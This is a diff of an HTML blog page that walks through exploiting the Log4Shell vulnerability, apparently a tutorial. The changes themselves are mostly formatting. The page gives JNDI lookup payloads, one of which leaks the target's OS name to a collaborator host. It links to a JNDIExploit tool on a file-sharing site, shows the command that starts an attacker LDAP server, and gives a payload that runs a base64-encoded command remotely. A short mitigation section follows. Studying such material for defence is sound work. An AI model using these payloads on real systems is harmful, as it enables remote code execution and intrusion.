@@ -298,13 +298,13 @@ ${jndi:ldap://${main:4}.domain.com/j}
 ${jndi:ldap://${main:bar}.domain.com/j}
 </code></pre>
                                                        
-                    <h2>5.<u>Exploitaion</u></h2>
+                    <h2>5.<u>Exploitaion</u></h2><br>
 <p> 
-1. Before RCE, Make sure and try to get the Java version and os name of the target. For getting os name, we’ll use this payload: ${jndi:ldap://${sys:os.name}.xyz.burpcollaborator.net/a}
-2. Now download this zip file in your instance and unzip it.<a href="https://anonfiles.com/xd07G204v9/JNDIExploit.v1.2_zip">Here</a><br>
-3. Start the LDAP server<br>
-    <code>java -jar JNDIExploit-1.2-SNAPSHOT.jar -i YOUR_PUBLIC_IP -p 8888</code>
-4. We just need to inject the payload.<code>${jndi:ldap://YOUR_PUBLIC_IP:1389/Basic/Command/Base64/BASE64_ENCODED_COMMAND}</code><br>
+1. Before RCE, Make sure and try to get the Java version and os name of the target. For getting os name, we’ll use this payload: ${jndi:ldap://${sys:os.name}.xyz.burpcollaborator.net/a}<br><br>
+2. Now download this zip file in your instance and unzip it.<a href="https://anonfiles.com/xd07G204v9/JNDIExploit.v1.2_zip">Here</a><br><br>
+3. Start the LDAP server<br><br>
+    <code>java -jar JNDIExploit-1.2-SNAPSHOT.jar -i YOUR_PUBLIC_IP -p 8888</code><br><br>
+4. We just need to inject the payload.<code>${jndi:ldap://YOUR_PUBLIC_IP:1389/Basic/Command/Base64/BASE64_ENCODED_COMMAND}</code><br><br>
 5. we’ll encode our command in base64:<br>    
    <img src="img/blog/step4.jpg" class="img-fluid" alt="step4"/> <br>
 6. You can see the hit like below:<pre><code>
@@ -322,19 +322,21 @@ ${jndi:ldap://${main:bar}.domain.com/j}
     </code></pre><br>
     
                     <h2>6.<u>Mitigation</u></h2>
+                    <img src="img/blog/jndi-attack.jpeg " class="img-fluid" alt="mitigation"/><br />
     1. <b>SPOT VULNERABLE APPLICATIONS</b><br>
 
-Ask admin/system team to run a search/grep command on all servers to spot any file with the name “log4j2”, Then check if it is a vulnerable version or not”<br>
+Ask admin/system team to run a search/grep command on all servers to spot any file with the name “log4j2”, Then check if it is a vulnerable version or not”<br />
 
     2. <b>PERMANENT MITIGATION</b><br>
 
 Version 2.15.0 of log4j has been released without the vulnerability. log4j-core.jar is available on Apache Log4j page below, You
-can download it and update your system<br>
+can download it and update your system<br />
     
     3. <b>TEMPORARY MITIGATION</b><br>
 
-    “Add <code>“log4j.format.msg.nolookups=true”</code> to the global configuration of your server/web applications”<br>
+    “Add <code>“log4j.format.msg.nolookups=true”</code> to the global configuration of your server/web applications”<br />
 
+                    
     <h2>References & Credits</h2>
                     <p>Thanks you so much</p>
                     Features:-
